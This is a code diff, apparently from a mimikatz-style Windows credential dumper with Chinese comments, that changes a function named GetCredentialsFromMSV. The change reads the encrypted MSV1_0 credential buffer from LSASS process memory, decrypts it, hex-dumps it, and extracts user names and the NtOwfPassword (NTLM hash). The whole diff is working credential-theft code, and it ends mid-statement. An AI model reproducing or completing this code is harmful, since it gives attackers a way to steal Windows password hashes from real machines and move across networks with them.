@@ -377,36 +377,44 @@ VOID GetCredentialsFromMSV() {
 				ReadFromLsass(primaryCredPtr, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
 
 				// 读取加密的凭据缓冲区
-				//LSA_UNICODE_STRING credStr = primaryCred.Credentials;
-				LSA_UNICODE_STRING* credStr = ExtractUnicodeString((PUNICODE_STRING)(
-					(PUCHAR)primaryCredPtr + offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials)
-					));
-			
+				LSA_UNICODE_STRING* credStr = &primaryCred.Credentials;
+
 				if (credStr->Length && credStr->Buffer) {
-					BYTE encryptedCreds[2048] = { 0 };
-
 					WCHAR passDecrypted[1024];
-
-					memset(encryptedCreds, 0, sizeof(encryptedCreds));
-					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
 
 					LSA_UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
 						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
 						));
+
 					if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
 					else wprintf(L"Username: [NULL]\n");
 
-					//int decLen = DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
-
 					// 假设decryptedCreds已填充，且长度足够
 					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER {
+						LSA_UNICODE_STRING LogonDomainName;
 						LSA_UNICODE_STRING UserName;
 						LSA_UNICODE_STRING Domaine;
 						LSA_UNICODE_STRING NtOwfPassword;
 						// ... 其他字段
 					} MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, * PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER;
 
-					PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)encryptedCreds;
+					BYTE encryptedCreds[8192] = { 0 };
+					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
+					BYTE decryptedCreds[8192] = { 0 };
+					DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
+					HexdumpBytesPacked((PUCHAR)decryptedCreds, 64);
+					PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)decryptedCreds;
+
+					LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
+						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, UserName)
+						));
+					if (UserName->Length != 0 && UserName->Buffer) {
+						wprintf(L"UserName->Length: %d\n", UserName->Length);
+						wprintf(L"Username: %ls\n", UserName->Buffer);
+					}
+					else {
+						wprintf(L"Username: [NULL]\n");
+					}
 
 					LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
 						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, NtOwfPassword)
